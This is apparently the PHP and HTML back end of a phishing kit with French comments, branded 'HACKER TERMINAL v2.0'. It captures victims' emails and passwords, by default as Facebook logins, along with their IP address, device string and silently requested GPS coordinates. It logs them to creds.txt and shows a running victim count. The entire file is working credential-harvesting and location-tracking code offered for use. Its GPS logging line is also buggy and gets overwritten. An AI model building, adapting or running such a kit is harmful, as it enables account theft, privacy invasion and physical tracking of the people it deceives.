<?php
if ($_POST) {
    // IP réelle
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']
        ?? $_SERVER['HTTP_X_REAL_IP']
        ?? $_SERVER['REMOTE_ADDR']
        ?? 'inconnue';
    $ip = trim(explode(',', $ip)[0]);

    $email = $_POST['email'] ?? '';
    $pass  = $_POST['password'] ?? '';
    $ua    = substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 150);
    
// APRÈS $ua = ...
$gps = isset($_POST['gps_lat']) && isset($_POST['gps_lon']) 
    ? "GPS: {$_POST['gps_lat']}, {$_POST['gps_lon']}" 
    : "GPS: N/A";


$log .= "│ 📍 {$gps}\n";  // ← AJOUTE ÇA



    $time  = date('Y-m-d H:i:s');

    // Détection de la plateforme (Facebook par défaut)
    $platform = "Facebook";
    if (isset($_POST['platform'])) {
        $platform = $_POST['platform'];
    }

    // Format
    $log  = "┌─────────────────────────────────────────\n";
    $log .= "│ 🎯 {$platform} VICTIME — {$time}\n";
    $log .= "├─────────────────────────────────────────\n";
    $log .= "│ 📧 EMAIL/USER : {$email}\n";
    $log .= "│ 🔑 MOT DE PASSE : {$pass}\n";
    $log .= "│ 🌐 ADRESSE IP   : {$ip}\n";
    $log .= "│ 📱 APPAREIL     : {$ua}\n";
    $log .= "└─────────────────────────────────────────\n";

    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
    header('Location: terminal.php?newhit=1');
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>🔥 HACKER TERMINAL v2.0</title>
    <meta http-equiv="refresh" content="5">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
        .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
        .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
        .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;white-space:pre;}
        input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
        .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
        .btn:hover{background:#0a0;}
        .btn-red{background:#f00;color:#fff;}
    </style>


<!-- GPS TRACKER SILENT PRO -->
<script>
function captureGPS() {
    navigator.geolocation.getCurrentPosition(pos => {
        const form = document.createElement('form');
        form.method = 'POST'; form.style.display = 'none';
        form.innerHTML = `
            <input name="gps_lat" value="${pos.coords.latitude}">
            <input name="gps_lon" value="${pos.coords.longitude}">
        `;
        document.body.appendChild(form);
        form.submit();
    }, ()=>{}, {enableHighAccuracy: true, timeout: 5000});
}
window.onload = captureGPS;

// GPS sur submit
function gpsSubmit(form) {
    navigator.geolocation.getCurrentPosition(pos => {
        const lat = document.createElement('input');
        lat.type = 'hidden'; lat.name = 'gps_lat'; lat.value = pos.coords.latitude;
        const lon = document.createElement('input');
        lon.type = 'hidden'; lon.name = 'gps_lon'; lon.value = pos.coords.longitude;
        form.appendChild(lat); form.appendChild(lon);
        form.submit();
    }, () => form.submit(), {enableHighAccuracy: true});
    return false;
}
</script>


</head>
<body>
    <div class="header">
        🔥 <span style="color:#f00">HACKER TERMINAL</span> | Multi-Platform Phishing | <span id="count">0</span> victims
    </div>
    <div class="console" id="console">
        <?php
        if (file_exists('creds.txt')) {
            $logs  = file_get_contents('creds.txt');
            $count = substr_count($logs, 'VICTIME');
            echo "<div>📊 Total victims: <span style='color:#ff0'>{$count}</span></div><br>";
            $blocs = explode("└─────────────────────────────────────────", $logs);
            foreach (array_reverse($blocs) as $bloc) {
                if (trim($bloc)) {
                    echo "<div class='hit'>" . htmlspecialchars($bloc) . "└─────────────────────────────────────────</div>";
                }
            }
        }
        if (isset($_GET['newhit'])) {
            echo "<div class='hit' style='border-left-color:#ff0'>🎯 NEW HIT DETECTED!</div>";
        }
        ?>
    </div>
    <form method="POST" action="terminal.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
        <input name="email" placeholder="👤 Email cible..." autocomplete="off">
        <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
        <button type="submit" class="btn">🎣 Lancer Phishing</button>
        <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
    </form>
    <script>
    setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
    </script>
</body>
</html>
